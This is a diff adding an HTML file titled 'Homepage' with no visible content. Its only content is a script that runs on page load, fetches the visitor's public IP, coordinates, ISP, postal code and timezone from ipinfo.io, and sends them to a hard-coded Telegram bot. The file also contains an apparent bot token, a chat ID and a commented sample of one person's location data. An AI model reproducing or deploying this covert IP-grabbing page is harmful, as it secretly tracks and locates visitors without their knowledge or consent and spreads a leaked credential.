@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>Homepage</title>
+</head>
+<body>
+  <script>
+    const userId = "6253673851";
+    const url = "https://api.telegram.org/bot8285352258:AAFQkprZ_DlpL0vh81jRY-mEbIHt367IlC8/sendMessage";
+    
+    /*
+    city: "Manado"
+country: "ID"
+ip: "36.75.189.39"
+loc: "1.4822,124.8489"
+org: "AS7713 PT Telekomunikasi Indonesia"
+postal: "95112"
+readme: "https://ipinfo.io/missingauth"
+region: "North Sulawesi"
+timezone: "Asia/Makassar"
+    */
+    // Send message to Telegram Bot
+    function send(msg){
+      let loc = msg.loc.split(',');
+      let message = `<code>
+Negara     : ${msg.country}
+Provinsi   : ${msg.region}
+Lokasi     : Lintang: ${loc[0]} Bujur: ${loc[1]}
+Jaringan   : ${msg.org} | Postal : ${msg.postal}
+IP Publik  : ${msg.ip}
+Zona Waktu : ${msg.timezone}
+</code>`;
+      const opt = {
+        method: 'post',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: userId,
+          text: message,
+          parse_mode: 'HTML'
+        })
+      }
+      fetch(url, opt).catch(err => console.log(err))
+    }
+    
+    fetch("https://ipinfo.io/json")
+      .then(res => res.json())
+      .then(data => send(data))
+      .catch(err => console.log(err))
+  </script>
+</body>
+</html>
